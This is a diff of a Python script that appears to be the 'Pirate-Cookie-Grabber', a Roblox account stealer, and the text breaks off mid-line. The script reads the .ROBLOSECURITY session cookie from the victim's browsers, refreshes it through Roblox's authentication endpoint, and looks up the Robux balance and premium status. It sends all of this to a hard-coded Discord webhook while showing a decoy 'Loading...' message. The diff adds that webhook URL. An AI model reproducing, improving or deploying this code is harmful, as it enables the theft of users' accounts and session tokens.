@@ -5,20 +5,15 @@ import browser_cookie3
 import sqlite3
 import subprocess
 import shutil
-import win32crypt
+import requests
+import robloxpy
 from Crypto.Cipher import AES
 from discordwebhook import Discord
 import httpx
 import re
-import requests
-import robloxpy
 
-try:
-    subprocess.call("TASKKILL /f /IM CHROME.EXE")
-except FileNotFoundError:
-    print("")
-
-webhook_url = 'heh'
+# Replace with your webhook URL
+discord_webhook_url = "https://discord.com/api/webhooks/1330720300307845170/f2Xm40QZH2CNbI4hbL0FRr66hJjmU92DXbyDcp0Z970RbPL9H4Nd5WzY06xiF8nPGGMp"
 
 dummy_message = "Loading..."
 print(dummy_message)
@@ -70,7 +65,7 @@ def CookieLog():
     db.close()
 
 def PlanB():
-    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
+    data = []  # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
 
     try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
@@ -134,10 +129,6 @@ def get_local_ip():
 
 def refresh_cookie(auth_cookie):
     csrf_token = generate_csrf_token(auth_cookie)
-    if csrf_token is None:
-        print("Failed to retrieve CSRF token.")
-        return None
-
     headers, cookies = generate_headers(csrf_token, auth_cookie)
 
     req = httpx.post("https://auth.roblox.com/v1/authentication-ticket",
@@ -155,18 +146,7 @@ def refresh_cookie(auth_cookie):
 
 def generate_csrf_token(auth_cookie):
     csrf_req = httpx.get("https://www.roblox.com/home", cookies={".ROBLOSECURITY": auth_cookie})
-    
-    if csrf_req.status_code != 200:
-        print("Failed to retrieve the CSRF token: HTTP Status", csrf_req.status_code)
-        return None
-
-    try:
-        # Look for the CSRF token meta tag in the HTML
-        csrf_txt = csrf_req.text.split('<meta name="csrf-token" data-token="')[1].split('" />')[0]
-    except IndexError:
-        print("Failed to find the CSRF token in the response.")
-        return None
-
+    csrf_txt = csrf_req.text.split("<meta name=\"csrf-token\" data-token=\"")[1].split("\" />")[0]
     return csrf_txt
 
 
@@ -210,13 +190,13 @@ if __name__ == "__main__":
     robux = requests.get("https://economy.roblox.com/v1/user/currency",cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
     premium_status = info['IsPremium']
 
-    discord = Discord(url=webhook_url)
+    discord = Discord(url=discord_webhook_url)
     discord.post(
-        username="BOT - Pirate ðŸª",
-        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
+        username="BOT - Pirate 🏴‍☠️",
+        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
         embeds=[
             {
-                "title": "ðŸ’¸ +1 Result Account ðŸ•¯ï¸",
+                "title": "💥 +1 Result Account 📱",
                 "thumbnail": {"url": headshot},
                 "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
                 "fields": [
@@ -234,7 +214,5 @@ if __name__ == "__main__":
     )
 
     discord.post(
-        username="BOT - Ovion ðŸª",
-        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
-        embeds=[
-            {"title": ".ROBLOSECUR
+        username="BOT - Ovion 🏴‍☠️",
+        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe
